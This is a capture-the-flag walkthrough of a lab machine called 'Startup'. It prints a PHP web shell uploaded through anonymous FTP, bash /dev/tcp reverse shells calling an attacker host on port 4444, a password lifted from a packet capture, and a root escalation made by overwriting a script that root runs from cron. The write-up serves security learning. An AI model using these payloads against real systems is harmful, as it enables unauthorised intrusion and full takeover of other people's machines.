# Startup
---

## Initial Enumeration

As always, we start with some basic enumeration.

```bash
nmap -sV -sC 10.130.180.191
```

The scan reveals an FTP service on **port 21** with **Anonymous** login enabled.

![](images/Pasted%20image%2020260623144442.png)

Let's see what we can find.

```bash
ftp 10.130.180.191
#username: Anonymous
#Password: Anything           (u can type one letter if u want too)
```

![](images/Pasted%20image%2020260623145345.png)

After downloading the available files, we discover that **Maya** appears to be an employee with an account on the machine.

---

## Foothold

Since we have write access to the **/ftp** directory, we can upload a simple PHP web shell.

```php
<?php system($_GET['cmd']);?>
```

![](images/Pasted%20image%2020260623151122.png)

First, we test whether the server executes **.php** files. If that doesn't work, another extension such as **.phtml** would also be worth trying.

To verify code execution, we simply call our web shell.

```bash
curl "http://MACHINE_IP/files/ftp/shell.php?cmd=id"
```

![](images/Pasted%20image%2020260623152205.png)

Looks good.

Now we replace it with a proper reverse shell.

```php
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.143.26/4444 0>&1'");?>
```

![](images/Pasted%20image%2020260623152807.png)

After triggering the script, we get our shell.

---

## User Flag

With a foothold established, it's time for the usual Linux enumeration: writable files, writable directories, cron jobs, capabilities, SUID binaries, and anything else that might help.

During enumeration, we find a file we own containing the famous **"secret spicy soup recipe"**...

**love**

![](images/Pasted%20image%2020260623210226.png)

More importantly, we also own a directory that's worth exploring.

Inside it, we discover a packet capture file. We can easily transfer it by serving it over a small Python web server and then opening it in **Wireshark**.

```bash
wget http://MACHINE_IP:8000/suspicious.pcapng
```

![](images/Pasted%20image%2020260623211144.png)

![](images/Pasted%20image%2020260623211426.png)

Looking through the capture, we notice an old connection between two hosts.

If we right-click a packet and choose **Follow Stream**, we can inspect the conversation. In this case, we find a reverse shell session from **port 4444** to **40932**.

![](images/Pasted%20image%2020260623212437.png)

Following **stream 7** reveals something interesting.

![](images/Pasted%20image%2020260623212616.png)

We can see someone typing the password:

> **c4ntg3t3n0ughsp1c3**

before running:

```bash
sudo -l
```

The password wasn't valid for that command, but it's definitely worth trying elsewhere.

Eventually, we test it against the user **Lennie**, and it turns out to be her password.

![](images/Pasted%20image%2020260623212958.png)

At this point, it's much more convenient to reconnect through SSH using Lennie's credentials.

After logging in, we retrieve the user flag.

![](images/Pasted%20image%2020260623213518.png)

---

## Privilege Escalation

Time to go after root.

Inside the **scripts** directory, we find a script called **planner.sh** that simply prints _"Done!"_.

Looking at the source code, however, shows that it executes another script:

**/etc/print.sh**

The interesting part is that we have full permissions over **print.sh**, meaning we could easily replace it with a reverse shell.

The only problem is that when we manually execute **planner.sh**, it runs with **Lennie's** privileges. For this to become useful, **planner.sh** needs to be executed by **root**.

![](images/Pasted%20image%2020260623214609.png)

A quick check doesn't reveal anything obvious.

No cron jobs.

```bash
cat /etc/crontab

find / -perm -4000 2>/dev/null
```

![](images/Pasted%20image%2020260623214847.png)

No interesting capabilities either.

```bash
getcap / -r 2>/dev/null
```

![](images/Pasted%20image%2020260623214913.png)

So we let **pspy** watch the system for background activity.

Sure enough, after a short wait, we notice that **planner.sh** is executed every minute, immediately followed by **print.sh**.

![](images/Pasted%20image%2020260623224309.png)

Even better, it's running with **UID=0**, meaning it's executed as **root**.

Now the privilege escalation becomes straightforward.

We replace **/etc/print.sh** with our reverse shell payload.

```bash
bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'

#open a listening port
nc -lvnp 4444
```

![](images/Pasted%20image%2020260623225012.png)

Once the scheduled task runs again, we catch a shell as **root**.

All that's left is retrieving the root flag.

---

## Conclusion

A fun room that combines several different techniques without getting too complicated. It starts with FTP enumeration and a web shell, then moves into some packet analysis with Wireshark before finishing with a nice cron job abuse for privilege escalation. Definitely an enjoyable machine.

**— 0xchnk**